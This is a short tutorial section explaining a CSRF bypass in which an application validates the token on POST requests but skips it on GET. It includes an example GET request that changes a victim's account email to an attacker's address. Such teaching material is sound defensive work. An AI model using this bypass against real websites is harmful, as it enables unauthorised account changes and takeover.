# 9. Validation of CSRF token depends on request method

🔍 Some applications correctly validate the CSRF token when the request uses the **POST method**, but **skip the validation** when the **GET method** is used.

🚨 In this situation, an attacker can **switch to the GET method** to bypass the validation and successfully deliver a **CSRF attack**.

### 💥 **Example Exploit Using GET Method**

```
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

🧨 The lack of CSRF validation on GET requests allows the attacker to make unauthorized changes using a simple URL.